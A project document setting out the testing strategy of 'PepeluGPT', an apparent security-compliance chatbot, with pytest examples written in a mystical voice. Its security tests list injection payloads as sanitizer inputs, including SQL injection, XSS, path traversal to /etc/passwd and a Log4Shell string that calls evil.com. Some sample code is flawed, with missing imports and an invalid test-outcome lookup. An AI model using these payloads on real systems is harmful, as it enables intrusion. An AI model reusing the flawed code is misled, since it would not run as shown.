# ğŸ§ª Testing Framework & Strategies

> *"In the sacred art of testing, every assertion is a prayer for code reliability, every test case a guardian against digital chaos."* ğŸ”¬

This document outlines PepeluGPT's comprehensive testing strategy, embracing both technical rigor and cosmic consciousness in our quality assurance practices.

---

## ğŸ¯ **Testing Philosophy**

### **The Three Pillars of Sacred Testing**

#### ğŸ”® **Oracle Testing** - *Wisdom Validation*
- **Purpose**: Validate deep logic and complex decision trees
- **Focus**: Integration testing, end-to-end scenarios, user journey validation
- **Style**: Contemplative, thorough, exploring edge cases with cosmic perspective

#### ğŸ“Š **Compliance Testing** - *Standards Verification*
- **Purpose**: Ensure regulatory compliance and security standards
- **Focus**: Security testing, audit trail validation, policy enforcement
- **Style**: Methodical, documentation-heavy, audit-ready test reports

#### ğŸŒ  **Cosmic Testing** - *Creative Quality Assurance*
- **Purpose**: User experience testing, visual validation, creative workflows
- **Focus**: UI/UX testing, accessibility, aesthetic validation
- **Style**: Flowing, intuitive, beauty-conscious quality checks

---

## ğŸ—ï¸ **Testing Architecture**

### **Test Directory Structure**

```
tests/
â”œâ”€â”€ unit/                    # Unit tests - atomic functionality
â”‚   â”œâ”€â”€ core/               # Core business logic tests
â”‚   â”œâ”€â”€ manifest/           # Version and identity tests
â”‚   â”œâ”€â”€ personalities/      # Personality mode tests
â”‚   â””â”€â”€ utilities/          # Helper function tests
â”œâ”€â”€ integration/            # Integration tests - component interaction
â”‚   â”œâ”€â”€ api/               # API integration tests
â”‚   â”œâ”€â”€ database/          # Database integration tests
â”‚   â””â”€â”€ external/          # Third-party service tests
â”œâ”€â”€ e2e/                   # End-to-end tests - complete user journeys
â”‚   â”œâ”€â”€ oracle/            # Oracle mode user scenarios
â”‚   â”œâ”€â”€ compliance/        # Compliance workflow tests
â”‚   â””â”€â”€ cosmic/            # Cosmic experience tests
â”œâ”€â”€ performance/           # Performance and load tests
â”œâ”€â”€ security/              # Security-focused test suites
â”œâ”€â”€ fixtures/              # Test data and mock objects
â””â”€â”€ conftest.py           # Pytest configuration and shared fixtures
```

---

## ğŸ§© **Unit Testing Strategy**

### **Core Principles**

```python
# test_cosmic_example.py
import pytest
from unittest.mock import Mock, patch
from src.personalities.oracle import OracleMode

class TestOracleMode:
    """ğŸ”® Sacred tests for Oracle wisdom validation"""
    
    def test_wisdom_generation_depth(self):
        """Test that Oracle responses contain layered wisdom"""
        oracle = OracleMode()
        query = "What is zero trust architecture?"
        
        response = oracle.generate_response(query)
        
        # Oracle responses should have mystical elements
        assert "cosmic" in response.lower() or "digital" in response.lower()
        assert len(response.split("\\n")) > 3  # Multi-layered response
        assert any(emoji in response for emoji in ["ğŸ”®", "ğŸŒŒ", "âœ§"])
    
    @pytest.mark.parametrize("query,expected_metaphor", [
        ("network security", "digital realm"),
        ("data protection", "sacred data"),
        ("access control", "guardian")
    ])
    def test_metaphorical_language(self, query, expected_metaphor):
        """Validate Oracle's use of spiritual metaphors"""
        oracle = OracleMode()
        response = oracle.generate_response(query)
        assert expected_metaphor in response.lower()
```

### **Compliance Testing Standards**

```python
# test_compliance_validation.py
import pytest
from src.personalities.compliance import ComplianceMode
from src.frameworks.nist import NISTFramework

class TestComplianceMode:
    """ğŸ“Š Rigorous compliance validation tests"""
    
    def test_nist_control_mapping(self):
        """Verify accurate NIST control identification"""
        compliance = ComplianceMode()
        query = "AC-1 access control policy requirements"
        
        response = compliance.analyze_control(query)
        
        assert "AC-1" in response
        assert "policy" in response.lower()
        assert response.includes_citation()
        assert response.risk_level in ["LOW", "MODERATE", "HIGH"]
    
    def test_audit_trail_generation(self):
        """Ensure all compliance queries generate audit trails"""
        compliance = ComplianceMode()
        query = "SOC 2 Type II requirements"
        
        with patch('src.audit.AuditLogger') as mock_logger:
            response = compliance.generate_response(query)
            
            mock_logger.log_compliance_query.assert_called_once()
            assert response.audit_id is not None
    
    @pytest.mark.security
    def test_sensitive_data_handling(self):
        """Validate proper handling of sensitive information"""
        compliance = ComplianceMode()
        sensitive_query = "PII handling for GDPR compliance"
        
        response = compliance.generate_response(sensitive_query)
        
        # Should not echo back sensitive terms inappropriately
        assert response.sanitized
        assert response.privacy_level == "PROTECTED"
```

---

## ğŸ”— **Integration Testing**

### **API Integration Tests**

```python
# test_api_integration.py
import pytest
import asyncio
from httpx import AsyncClient
from src.api.main import app

class TestPersonalityAPI:
    """ğŸ­ Test personality mode API integration"""
    
    @pytest.mark.asyncio
    async def test_mode_switching(self):
        """Test seamless personality mode transitions"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Start in default mode
            response = await client.post("/chat", json={
                "message": "Hello PepeluGPT"
            })
            assert response.status_code == 200
            
            # Switch to Oracle mode
            oracle_response = await client.post("/chat", json={
                "message": "/mode oracle"
            })
            assert "ğŸ”®" in oracle_response.json()["response"]
            
            # Verify Oracle personality persists
            follow_up = await client.post("/chat", json={
                "message": "What is cybersecurity?"
            })
            response_text = follow_up.json()["response"]
            assert any(word in response_text.lower() 
                      for word in ["cosmic", "digital realm", "wisdom"])
    
    @pytest.mark.asyncio
    async def test_compliance_report_generation(self):
        """Test end-to-end compliance report workflow"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            response = await client.post("/compliance/analyze", json={
                "framework": "NIST_CSF",
                "query": "Implement identity verification controls"
            })
            
            assert response.status_code == 200
            report = response.json()
            
            assert "executive_summary" in report
            assert "detailed_findings" in report
            assert "control_mapping" in report
            assert report["risk_level"] in ["LOW", "MODERATE", "HIGH"]
```

### **Database Integration Tests**

```python
# test_database_integration.py
import pytest
from src.database import VectorDatabase
from src.models.embeddings import DocumentEmbedding

class TestVectorDatabase:
    """ğŸ“š Vector database integration validation"""
    
    @pytest.fixture
    def vector_db(self):
        """Provide test vector database instance"""
        return VectorDatabase(connection_string="sqlite:///:memory:")
    
    def test_document_ingestion_workflow(self, vector_db):
        """Test complete document processing pipeline"""
        test_document = {
            "content": "NIST SP 800-53 Access Control guidelines",
            "source": "NIST",
            "framework": "SP_800_53",
            "control_family": "AC"
        }
        
        # Ingest document
        doc_id = vector_db.ingest_document(test_document)
        assert doc_id is not None
        
        # Verify embedding generation
        embedding = vector_db.get_embedding(doc_id)
        assert embedding is not None
        assert len(embedding.vector) > 0
        
        # Test semantic search
        results = vector_db.semantic_search("access control policies")
        assert len(results) > 0
        assert doc_id in [r.id for r in results]
```

---

## ğŸš€ **End-to-End Testing**

### **User Journey Validation**

```python
# test_user_journeys.py
import pytest
from playwright.async_api import async_playwright

class TestUserExperience:
    """ğŸŒŸ Complete user journey validation"""
    
    @pytest.mark.e2e
    async def test_oracle_consultation_journey(self):
        """Test complete Oracle mode consultation experience"""
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()
            
            # Navigate to PepeluGPT interface
            await page.goto("http://localhost:8000")
            
            # Verify cosmic branding
            banner = await page.locator(".cosmic-banner").text_content()
            assert "Born of Light, Forged for Defense" in banner
            
            # Switch to Oracle mode
            await page.fill(".chat-input", "/mode oracle")
            await page.press(".chat-input", "Enter")
            
            # Verify Oracle mode activation
            response = await page.locator(".chat-response").last.text_content()
            assert "ğŸ”®" in response
            
            # Ask philosophical question
            await page.fill(".chat-input", 
                           "What is the spiritual essence of cybersecurity?")
            await page.press(".chat-input", "Enter")
            
            # Validate Oracle-style response
            oracle_response = await page.locator(".chat-response").last.text_content()
            assert any(word in oracle_response.lower() 
                      for word in ["cosmic", "sacred", "wisdom", "digital realm"])
            
            await browser.close()
    
    @pytest.mark.e2e
    async def test_compliance_workflow(self):
        """Test complete compliance analysis workflow"""
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()
            
            await page.goto("http://localhost:8000")
            
            # Switch to Compliance mode
            await page.fill(".chat-input", "/mode compliance")
            await page.press(".chat-input", "Enter")
            
            # Request compliance analysis
            await page.fill(".chat-input", 
                           "Analyze NIST CSF implementation requirements")
            await page.press(".chat-input", "Enter")
            
            # Verify structured compliance response
            response = await page.locator(".compliance-report").text_content()
            assert "Executive Summary" in response
            assert "Risk Level:" in response
            assert "Control Framework Mapping" in response
            
            await browser.close()
```

---

## âš¡ **Performance Testing**

### **Load Testing Strategy**

```python
# test_performance.py
import pytest
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor
from src.api.main import app

class TestPerformance:
    """âš¡ Performance and scalability validation"""
    
    @pytest.mark.performance
    def test_concurrent_personality_switches(self):
        """Test system stability under concurrent mode switching"""
        def switch_personality(session_id):
            # Simulate user switching between personalities rapidly
            for mode in ["oracle", "compliance", "cosmic", "default"]:
                response = app.test_client().post("/chat", json={
                    "session_id": session_id,
                    "message": f"/mode {mode}"
                })
                assert response.status_code == 200
        
        # Simulate 50 concurrent users
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(switch_personality, f"session_{i}") 
                      for i in range(50)]
            
            for future in futures:
                future.result(timeout=30)  # Should complete within 30 seconds
    
    @pytest.mark.performance
    def test_vector_search_performance(self):
        """Test vector database query performance"""
        from src.database import VectorDatabase
        
        vector_db = VectorDatabase()
        
        # Measure search response time
        start_time = time.time()
        results = vector_db.semantic_search("NIST cybersecurity framework")
        end_time = time.time()
        
        assert len(results) > 0
        assert (end_time - start_time) < 2.0  # Should respond within 2 seconds
    
    @pytest.mark.stress
    def test_memory_usage_stability(self):
        """Test memory usage under extended operation"""
        import psutil
        import gc
        
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        # Simulate extended usage
        for i in range(1000):
            app.test_client().post("/chat", json={
                "message": f"Test query {i} for memory stability"
            })
            
            if i % 100 == 0:
                gc.collect()  # Force garbage collection
        
        final_memory = process.memory_info().rss
        memory_increase = (final_memory - initial_memory) / initial_memory
        
        # Memory increase should be less than 50% after 1000 requests
        assert memory_increase < 0.5
```

---

## ğŸ”’ **Security Testing**

### **Security Test Suite**

```python
# test_security.py
import pytest
from src.security import InputSanitizer, AuthenticationManager

class TestSecurity:
    """ğŸ›¡ï¸ Security validation and penetration testing"""
    
    @pytest.mark.security
    def test_input_sanitization(self):
        """Test protection against injection attacks"""
        sanitizer = InputSanitizer()
        
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "{{config.__class__.__init__.__globals__}}",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = sanitizer.sanitize(malicious_input)
            assert sanitized != malicious_input
            assert not sanitizer.contains_threats(sanitized)
    
    @pytest.mark.security
    def test_authentication_bypass_protection(self):
        """Test protection against authentication bypass"""
        auth_manager = AuthenticationManager()
        
        bypass_attempts = [
            {"user": "admin", "password": "' OR '1'='1"},
            {"user": "admin'--", "password": ""},
            {"user": "admin", "password": "password' UNION SELECT * FROM users--"}
        ]
        
        for attempt in bypass_attempts:
            result = auth_manager.authenticate(attempt["user"], attempt["password"])
            assert result.is_authenticated is False
            assert result.threat_detected is True
    
    @pytest.mark.security
    def test_sensitive_data_exposure(self):
        """Test protection against sensitive data exposure"""
        response = app.test_client().post("/chat", json={
            "message": "Show me all user passwords"
        })
        
        response_text = response.get_json()["response"]
        
        # Should not contain sensitive patterns
        sensitive_patterns = [
            r"password",
            r"secret",
            r"key",
            r"token",
            r"\d{4}-\d{4}-\d{4}-\d{4}",  # Credit card pattern
            r"\d{3}-\d{2}-\d{4}"         # SSN pattern
        ]
        
        for pattern in sensitive_patterns:
            assert not re.search(pattern, response_text, re.IGNORECASE)
```

---

## ğŸ“Š **Test Coverage & Reporting**

### **Coverage Configuration**

```ini
# .coveragerc
[run]
source = src/
omit = 
    */tests/*
    */venv/*
    */migrations/*
    */__pycache__/*

[report]
exclude_lines =
    pragma: no cover
    def __repr__
    raise AssertionError
    raise NotImplementedError

[html]
directory = htmlcov

[xml]
output = coverage.xml
```

### **Test Reporting Pipeline**

```python
# conftest.py
import pytest
import json
from datetime import datetime

def pytest_sessionfinish(session, exitstatus):
    """Generate cosmic test report after test session"""
    
    # Collect test results
    passed = len([r for r in session.items if r.outcome == "passed"])
    failed = len([r for r in session.items if r.outcome == "failed"])
    skipped = len([r for r in session.items if r.outcome == "skipped"])
    
    # Generate cosmic report
    cosmic_report = {
        "ğŸŒŒ": "Cosmic Test Session Complete",
        "timestamp": datetime.now().isoformat(),
        "results": {
            "âœ… passed": passed,
            "âŒ failed": failed,
            "â­ï¸ skipped": skipped
        },
        "cosmic_wisdom": generate_test_wisdom(exitstatus),
        "guardian_status": "ğŸ›¡ï¸ Digital realm protected" if exitstatus == 0 else "âš ï¸ Guardians needed"
    }
    
    with open("cosmic_test_report.json", "w") as f:
        json.dump(cosmic_report, f, indent=2)

def generate_test_wisdom(exit_status):
    """Generate cosmic wisdom based on test results"""
    if exit_status == 0:
        return "ğŸ”® All tests flow in harmony with cosmic order"
    else:
        return "ğŸŒ  The universe calls for debugging meditation"
```

---

## ğŸ¯ **Testing Best Practices**

### **Sacred Testing Principles**

1. **ğŸ”® Oracle Principle**: Tests should reveal deep truths about code behavior
2. **ğŸ“Š Compliance Standard**: Every feature must have corresponding security tests
3. **ğŸŒ  Cosmic Flow**: Tests should be beautiful, readable, and maintainable
4. **ğŸ›¡ï¸ Defense First**: Security testing is not optional
5. **ğŸ“ˆ Continuous Evolution**: Test suite evolves with the codebase

### **Test Organization Guidelines**

- **Naming Convention**: `test_<feature>_<scenario>_<expected_outcome>()`
- **Documentation**: Every test class includes cosmic purpose comment
- **Fixtures**: Shared test data organized in `fixtures/` directory
- **Parametrization**: Use pytest parameters for multiple scenario testing
- **Markers**: Custom markers for test categorization (`@pytest.mark.oracle`)

### **Continuous Testing Integration**

```yaml
# GitHub Actions integration
- name: ğŸ§ª Execute Sacred Test Suite
  run: |
    pytest --cov=src --cov-report=xml --cov-report=html
    pytest --html=cosmic_test_report.html --self-contained-html
    
- name: ğŸ“Š Upload Cosmic Coverage
  uses: codecov/codecov-action@v3
  with:
    file: ./coverage.xml
    
- name: ğŸ”® Archive Test Artifacts
  uses: actions/upload-artifact@v3
  with:
    name: cosmic-test-results
    path: |
      htmlcov/
      cosmic_test_report.html
      cosmic_test_report.json
```

---

*This testing framework embodies the sacred quality assurance principles of PepeluGPT - where every test is a guardian against digital chaos, every assertion a prayer for code reliability, and every coverage report a map of our cosmic journey toward perfection.* ğŸ›¡ï¸âœ¨

*"In the crucible of testing, code transforms from mere possibility to divine certainty."*
